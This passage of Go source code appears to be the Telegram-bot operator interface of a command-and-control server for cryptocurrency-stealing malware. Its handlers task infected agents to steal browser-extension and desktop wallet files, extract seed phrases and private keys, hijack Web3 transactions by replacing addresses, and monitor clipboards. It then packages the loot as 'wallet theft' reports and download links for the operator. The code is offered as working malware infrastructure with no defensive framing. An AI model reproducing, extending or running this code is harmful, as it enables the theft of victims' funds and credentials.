	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = keyboard
	tb.bot.Send(msg)
}

func (tb *TelegramBot) Start() {
	log.Printf("Starting Telegram bot...")

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates := tb.bot.GetUpdatesChan(u)

	for update := range updates {
		if update.Message != nil {
			// Handle regular messages
			if !tb.isAuthorized(update.Message.From.ID) {
				tb.sendMessage(update.Message.Chat.ID, "❌ Unauthorized access")
				continue
			}

			tb.handleCommand(update)
		} else if update.CallbackQuery != nil {
			// Handle callback queries (button presses)
			if !tb.isAuthorized(update.CallbackQuery.From.ID) {
				continue
			}

			tb.handleCallbackQuery(update.CallbackQuery)
		}
	}
}

// handleCallbackQuery handles button presses for file downloads
func (tb *TelegramBot) handleCallbackQuery(callback *tgbotapi.CallbackQuery) {
	chatID := callback.Message.Chat.ID
	data := callback.Data

	// Answer the callback to remove loading state
	answerCallback := tgbotapi.NewCallback(callback.ID, "")
	tb.bot.Request(answerCallback)

	if strings.HasPrefix(data, "download_json_") {
		taskID := strings.TrimPrefix(data, "download_json_")
		tb.handleDownloadJSON(chatID, taskID)
	} else if strings.HasPrefix(data, "download_txt_") {
		taskID := strings.TrimPrefix(data, "download_txt_")
		tb.handleDownloadTXT(chatID, taskID)
	} else if strings.HasPrefix(data, "download_raw_") {
		taskID := strings.TrimPrefix(data, "download_raw_")
		tb.handleDownloadRAW(chatID, taskID)
	} else if strings.HasPrefix(data, "view_files_") {
		taskID := strings.TrimPrefix(data, "view_files_")
		tb.handleViewFiles(chatID, taskID)
	}
}

// handleDownloadJSON creates and sends JSON file with wallet data
func (tb *TelegramBot) handleDownloadJSON(chatID int64, taskID string) {
	result := tb.c2Server.GetTaskResult(taskID)
	if result == nil || result.WalletData == nil {
		tb.sendMessage(chatID, "❌ Wallet data not found")
		return
	}

	// Create JSON file
	jsonData, err := json.MarshalIndent(result.WalletData, "", "  ")
	if err != nil {
		tb.sendMessage(chatID, "❌ Failed to create JSON file")
		return
	}

	// Create file
	filename := fmt.Sprintf("wallet_theft_%s.json", taskID[:8])
	file := tgbotapi.FileBytes{
		Name:  filename,
		Bytes: jsonData,
	}

	msg := tgbotapi.NewDocument(chatID, file)
	msg.Caption = fmt.Sprintf("📄 *Wallet Theft Data (JSON)*\n\n🏦 Wallets: %d\n📁 Files: %d\n💾 Size: %.2f MB",
		result.WalletData.TotalWallets, result.WalletData.TotalFiles, float64(result.WalletData.TotalSizeBytes)/1024/1024)
	msg.ParseMode = "Markdown"

	tb.bot.Send(msg)
}

// handleDownloadTXT creates and sends human-readable TXT file
func (tb *TelegramBot) handleDownloadTXT(chatID int64, taskID string) {
	result := tb.c2Server.GetTaskResult(taskID)
	if result == nil || result.WalletData == nil {
		tb.sendMessage(chatID, "❌ Wallet data not found")
		return
	}

	walletData := result.WalletData
	var content strings.Builder

	content.WriteString("HOT WALLET THEFT REPORT\n")
	content.WriteString("======================\n\n")
	content.WriteString(fmt.Sprintf("Extraction Time: %s\n", time.Unix(walletData.Timestamp, 0).Format("2006-01-02 15:04:05")))
	content.WriteString(fmt.Sprintf("Agent ID: %s\n", walletData.AgentID))
	content.WriteString(fmt.Sprintf("Task ID: %s\n\n", taskID))

	content.WriteString("SUMMARY\n")
	content.WriteString("-------\n")
	content.WriteString(fmt.Sprintf("Wallets Detected: %d\n", walletData.TotalWallets))
	content.WriteString(fmt.Sprintf("Files Stolen: %d\n", walletData.TotalFiles))
	content.WriteString(fmt.Sprintf("Total Size: %.2f MB\n\n", float64(walletData.TotalSizeBytes)/1024/1024))

	if len(walletData.DetectedWallets) > 0 {
		content.WriteString("DETECTED WALLETS\n")
		content.WriteString("----------------\n")
		for i, wallet := range walletData.DetectedWallets {
			content.WriteString(fmt.Sprintf("%d. %s (%s)\n", i+1, wallet.WalletName, wallet.WalletType))
			content.WriteString(fmt.Sprintf("   Install Path: %s\n", wallet.InstallPath))
			content.WriteString(fmt.Sprintf("   Data Directory: %s\n", wallet.DataDirectory))
			content.WriteString(fmt.Sprintf("   Installed: %t\n", wallet.IsInstalled))
			content.WriteString(fmt.Sprintf("   Running: %t\n", wallet.IsRunning))
			if wallet.ProcessID > 0 {
				content.WriteString(fmt.Sprintf("   Process ID: %d\n", wallet.ProcessID))
			}
			content.WriteString(fmt.Sprintf("   Files Found: %d\n", wallet.TotalFilesFound))
			content.WriteString(fmt.Sprintf("   Total Size: %.2f KB\n", float64(wallet.TotalSizeBytes)/1024))

			// List files by type
			if len(wallet.ConfigFiles) > 0 {
				content.WriteString(fmt.Sprintf("   Config Files (%d):\n", len(wallet.ConfigFiles)))
				for _, file := range wallet.ConfigFiles {
					content.WriteString(fmt.Sprintf("     - %s (%.2f KB)\n", file.FileName, float64(file.FileSize)/1024))
				}
			}
			if len(wallet.WalletFiles) > 0 {
				content.WriteString(fmt.Sprintf("   Wallet Files (%d):\n", len(wallet.WalletFiles)))
				for _, file := range wallet.WalletFiles {
					content.WriteString(fmt.Sprintf("     - %s (%.2f KB)\n", file.FileName, float64(file.FileSize)/1024))
				}
			}
			if len(wallet.KeystoreFiles) > 0 {
				content.WriteString(fmt.Sprintf("   Keystore Files (%d):\n", len(wallet.KeystoreFiles)))
				for _, file := range wallet.KeystoreFiles {
					content.WriteString(fmt.Sprintf("     - %s (%.2f KB)\n", file.FileName, float64(file.FileSize)/1024))
				}
			}
			if len(wallet.BackupFiles) > 0 {
				content.WriteString(fmt.Sprintf("   Backup Files (%d):\n", len(wallet.BackupFiles)))
				for _, file := range wallet.BackupFiles {
					content.WriteString(fmt.Sprintf("     - %s (%.2f KB)\n", file.FileName, float64(file.FileSize)/1024))
				}
			}
			if len(wallet.LogFiles) > 0 {
				content.WriteString(fmt.Sprintf("   Log Files (%d):\n", len(wallet.LogFiles)))
				for _, file := range wallet.LogFiles {
					content.WriteString(fmt.Sprintf("     - %s (%.2f KB)\n", file.FileName, float64(file.FileSize)/1024))
				}
			}
			content.WriteString("\n")
		}
	}

	// Create file
	filename := fmt.Sprintf("wallet_theft_%s.txt", taskID[:8])
	file := tgbotapi.FileBytes{
		Name:  filename,
		Bytes: []byte(content.String()),
	}

	msg := tgbotapi.NewDocument(chatID, file)
	msg.Caption = "📝 *Wallet Theft Report (TXT)*\n\nHuman-readable summary of all stolen wallet data"
	msg.ParseMode = "Markdown"

	tb.bot.Send(msg)
}

// handleDownloadRAW creates ZIP with individual wallet files
func (tb *TelegramBot) handleDownloadRAW(chatID int64, taskID string) {
	tb.sendMessage(chatID, "📁 *RAW File Download*\n\nRAW file download feature coming soon!\nFor now, use JSON format to access file contents (base64 encoded).")
}

// handleViewFiles shows detailed file list
func (tb *TelegramBot) handleViewFiles(chatID int64, taskID string) {
	result := tb.c2Server.GetTaskResult(taskID)
	if result == nil || result.WalletData == nil {
		tb.sendMessage(chatID, "❌ Wallet data not found")
		return
	}

	walletData := result.WalletData
	message := "🗂️ *STOLEN FILE DETAILS*\n\n"

	for _, wallet := range walletData.DetectedWallets {
		if wallet.TotalFilesFound == 0 {
			continue
		}

		message += fmt.Sprintf("💼 *%s*\n", wallet.WalletName)

		allFiles := []config.HotWalletFile{}
		allFiles = append(allFiles, wallet.ConfigFiles...)
		allFiles = append(allFiles, wallet.WalletFiles...)
		allFiles = append(allFiles, wallet.KeystoreFiles...)
		allFiles = append(allFiles, wallet.BackupFiles...)
		allFiles = append(allFiles, wallet.LogFiles...)

		for _, file := range allFiles {
			encryptedIcon := ""
			if file.IsEncrypted {
				encryptedIcon = "🔒 "
			}
			message += fmt.Sprintf("  %s`%s` (%.2f KB)\n", encryptedIcon, file.FileName, float64(file.FileSize)/1024)
			message += fmt.Sprintf("    📍 %s\n", file.FilePath)
			if file.Description != "" {
				message += fmt.Sprintf("    📝 %s\n", file.Description)
			}
		}
		message += "\n"
	}

	if len(message) > 4000 {
		message = "🗂️ *STOLEN FILE DETAILS*\n\n"
		message += fmt.Sprintf("📊 Total files: %d\n", walletData.TotalFiles)
		message += fmt.Sprintf("💾 Total size: %.2f MB\n\n", float64(walletData.TotalSizeBytes)/1024/1024)
		message += "⚠️ File list too long for display\n"
		message += "Use JSON download to see complete file details"
	}

	tb.sendMessage(chatID, message)
}

// Browser Extension Wallet Commands

func (tb *TelegramBot) handleStealExtensionWallets(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_STEAL_BROWSER_WALLETS, "", nil)

	tb.sendMessage(chatID, fmt.Sprintf(
		"🔐 *Browser Extension Wallet Extraction Started*\n🆔 Task ID: `%s`\n\n"+
			"🎯 *Targeting:*\n"+
			"• MetaMask, Phantom, Coinbase Wallet\n"+
			"• Trust Wallet, Binance Chain Wallet\n"+
			"• Keplr, Solflare, Yoroi, TronLink\n"+
			"• And 20+ other wallet extensions\n\n"+
			"⏳ Scanning browser profiles...",
		taskID[:8],
	))

	go tb.waitForCryptoResult(chatID, taskID, 450*time.Second, "Browser Wallets")
}

func (tb *TelegramBot) handleMonitorWalletActivity(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	// Default 5 minute monitoring
	params := map[string]interface{}{
		"duration": 300,
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_MONITOR_WALLET_ACTIVITY, "", params)

	tb.sendMessage(chatID, fmt.Sprintf(
		"👁️ *Wallet Activity Monitoring Started*\n🆔 Task ID: `%s`\n\n"+
			"🎯 *Monitoring:*\n"+
			"• Transaction attempts\n"+
			"• Clipboard crypto addresses\n"+
			"• Wallet extension activity\n"+
			"• DApp connections\n\n"+
			"⏱️ Duration: 5 minutes\n"+
			"⏳ Monitoring in progress...",
		taskID[:8],
	))

	go tb.waitForActivityResult(chatID, taskID, 330*time.Second)
}

func (tb *TelegramBot) handleHijackTransactions(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_HIJACK_TRANSACTIONS, "", nil)

	tb.sendMessage(chatID, fmt.Sprintf(
		"🎯 *Transaction Hijacking Enabled*\n🆔 Task ID: `%s`\n\n"+
			"⚡ *Features Activated:*\n"+
			"• Web3 API interception\n"+
			"• Transaction parameter modification\n"+
			"• Address replacement\n"+
			"• Gas fee manipulation\n\n"+
			"⚠️ *Warning:* This is an advanced attack vector\n"+
			"⏳ Initializing hooks...",
		taskID[:8],
	))

	go tb.waitForTaskResult(chatID, taskID, 60*time.Second)
}

func (tb *TelegramBot) handleExtractWalletSeeds(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_EXTRACT_WALLET_SEEDS, "", nil)

	tb.sendMessage(chatID, fmt.Sprintf(
		"🌱 *Seed Phrase Extraction Started*\n🆔 Task ID: `%s`\n\n"+
			"🔍 *Searching for:*\n"+
			"• 12-word seed phrases\n"+
			"• 24-word seed phrases\n"+
			"• Mnemonic backups\n"+
			"• Recovery phrases\n\n"+
			"⏳ Deep scanning extension storage...",
		taskID[:8],
	))

	go tb.waitForCryptoResult(chatID, taskID, 90*time.Second, "Seed Phrases")
}

func (tb *TelegramBot) handleStealAllCrypto(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_STEAL_ALL_CRYPTO_ASSETS, "", nil)

	tb.sendMessage(chatID, fmt.Sprintf(
		"💰 *Comprehensive Crypto Asset Extraction*\n🆔 Task ID: `%s`\n\n"+
			"🎯 *Complete Extraction:*\n"+
			"• Browser extension wallets\n"+
			"• Desktop wallet applications\n"+
			"• Seed phrases & private keys\n"+
			"• Keystores & encrypted files\n"+
			"• Network configurations\n"+
			"• DApp connections\n\n"+
			"⏳ This may take several minutes...",
		taskID[:8],
	))

	go tb.waitForCryptoResult(chatID, taskID, 180*time.Second, "All Crypto Assets")
}

// Result handlers for crypto operations

func (tb *TelegramBot) waitForCryptoResult(chatID int64, taskID string, timeout time.Duration, dataType string) {
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	timeoutTimer := time.NewTimer(timeout)
	defer timeoutTimer.Stop()

	for {
		select {
		case <-ticker.C:
			result := tb.c2Server.GetTaskResult(taskID)
			if result != nil {
				tb.formatAndSendCryptoData(chatID, result, dataType)
				return
			}
		case <-timeoutTimer.C:
			tb.sendMessage(chatID, fmt.Sprintf(
				"⏰ *%s extraction timeout*\n🆔 Task ID: `%s`\n\n"+
					"The agent may be unresponsive or the operation is taking longer than expected.",
				dataType, taskID[:8],
			))
			return
		}
	}
}

func (tb *TelegramBot) waitForActivityResult(chatID int64, taskID string, timeout time.Duration) {
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	timeoutTimer := time.NewTimer(timeout)
	defer timeoutTimer.Stop()

	for {
		select {
		case <-ticker.C:
			result := tb.c2Server.GetTaskResult(taskID)
			if result != nil {
				tb.formatAndSendActivityData(chatID, result)
				return
			}
		case <-timeoutTimer.C:
			tb.sendMessage(chatID, fmt.Sprintf(
				"⏰ *Wallet activity monitoring timeout*\n🆔 Task ID: `%s`\n\n"+
					"Monitoring session completed or agent became unresponsive.",
				taskID[:8],
			))
			return
		}
	}
}

func (tb *TelegramBot) formatAndSendCryptoData(chatID int64, result *config.TaskResult, dataType string) {
	if !result.Success {
		tb.sendMessage(chatID, fmt.Sprintf(
			"❌ *%s extraction failed*\n🆔 Task ID: `%s`\n\n"+
				"Error: `%s`",
			dataType, result.TaskID[:8], result.Error,
		))
		return
	}

	// Check if we have crypto assets data
	if result.CryptoAssets != nil {
		assets := result.CryptoAssets

		message := fmt.Sprintf(
			"✅ *%s Extraction Complete*\n🆔 Task ID: `%s`\n\n"+
				"📊 **Summary:**\n"+
				"• 🔌 Extensions Found: %d\n"+
				"• 🌱 Seed Phrases: %d\n"+
				"• 🔑 Private Keys: %d\n"+
				"• 📍 Addresses: %d\n"+
				"• 🗃️ Keystores: %d\n\n",
			dataType, result.TaskID[:8],
			assets.TotalExtensions,
			assets.TotalSeeds,
			assets.TotalPrivateKeys,
			assets.TotalAddresses,
			assets.TotalKeystores,
		)

		// Add high-value targets
		if len(assets.HighValueTargets) > 0 {
			message += "🎯 **High-Value Targets:**\n"
			for _, target := range assets.HighValueTargets {
				message += fmt.Sprintf("• %s\n", target)
			}
			message += "\n"
		}

		// Add extension details
		if len(assets.ExtensionWallets) > 0 {
			message += "🔌 **Found Extensions:**\n"
			for i, ext := range assets.ExtensionWallets {
				if i >= 5 { // Limit to first 5 to avoid message length issues
					message += fmt.Sprintf("• ... and %d more\n", len(assets.ExtensionWallets)-5)
					break
				}
				message += fmt.Sprintf("• %s (%s) - %s\n", ext.ExtensionName, ext.WalletType, ext.Browser)
			}
			message += "\n"
		}

		// Add Pixeldrain download link if available
		if assets.DownloadURL != "" {
			message += "💾 **DOWNLOAD COMPLETE DATA:**\n"
			message += fmt.Sprintf("📁 [Click Here to Download Browser Wallet Files](%s)\n", assets.DownloadURL)
			message += "   └ ZIP archive with all extracted wallet data\n\n"
		}

		message += "💾 *Data saved to C2 server crypto-assets directory*"
		tb.sendMessage(chatID, message)
	} else {
		// Fallback to regular output
		tb.sendMessage(chatID, fmt.Sprintf(
			"✅ *%s Complete*\n🆔 Task ID: `%s`\n\n%s",
			dataType, result.TaskID[:8], result.Output,
		))
	}
}

func (tb *TelegramBot) formatAndSendActivityData(chatID int64, result *config.TaskResult) {
	if !result.Success {
		tb.sendMessage(chatID, fmt.Sprintf(
			"❌ *Wallet activity monitoring failed*\n🆔 Task ID: `%s`\n\n"+
				"Error: `%s`",
			result.TaskID[:8], result.Error,
		))
		return
	}

	// Check if we have wallet activity data
	if result.WalletActivity != nil {
		activity := result.WalletActivity

		message := fmt.Sprintf(
			"✅ *Wallet Activity Monitoring Complete*\n🆔 Task ID: `%s`\n\n"+
				"📊 **Activity Summary:**\n"+
				"• 🔄 Intercepted Transactions: %d\n"+
				"• 📋 Clipboard Replacements: %d\n"+
				"• 🎭 Fake Prompts: %d\n"+
				"• ⏱️ Monitoring Duration: %d seconds\n\n",
			result.TaskID[:8],
			len(activity.InterceptedTxs),
			len(activity.ClipboardReplacements),
			len(activity.FakePrompts),
			activity.LastActivity-activity.StartTime,
		)

		if len(activity.MonitoringExtensions) > 0 {
			message += "🔌 **Monitored Extensions:**\n"
			for _, ext := range activity.MonitoringExtensions {
				message += fmt.Sprintf("• %s\n", ext)
			}
			message += "\n"
		}

		message += "💾 *Activity data saved to C2 server wallet-activity directory*"
		tb.sendMessage(chatID, message)
	} else {
		// Fallback to regular output
		tb.sendMessage(chatID, fmt.Sprintf(
			"✅ *Wallet Activity Monitoring Complete*\n🆔 Task ID: `%s`\n\n%s",
			result.TaskID[:8], result.Output,
		))
	}
}
